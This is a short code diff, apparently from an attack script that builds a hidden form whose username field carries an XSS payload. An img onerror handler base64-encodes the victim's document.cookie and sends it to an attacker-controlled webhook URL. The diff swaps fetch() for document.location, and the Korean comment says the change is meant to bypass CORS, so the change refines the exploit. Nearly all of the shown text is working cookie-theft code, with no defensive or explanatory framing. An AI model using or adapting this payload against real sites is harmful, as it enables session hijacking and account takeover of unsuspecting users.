@@ -15,8 +15,8 @@
         usernameInput.type = 'hidden';
         usernameInput.name = 'username';
         
-        // 수정된 페이로드: 문자열 연결(+)을 사용해 webhookUrl 변수가 올바르게 삽입되도록 수정
-        usernameInput.value = '<img src=x onerror="fetch(\'' + webhookUrl + '?data=\' + btoa(document.cookie))">';
+        // 수정된 페이로드: CORS를 우회하기 위해 fetch() 대신 document.location을 사용
+        usernameInput.value = '<img src=x onerror="document.location=\'' + webhookUrl + '?data=\' + btoa(document.cookie)">';
         
         const passwordInput = document.createElement('input');
         passwordInput.type = 'hidden';
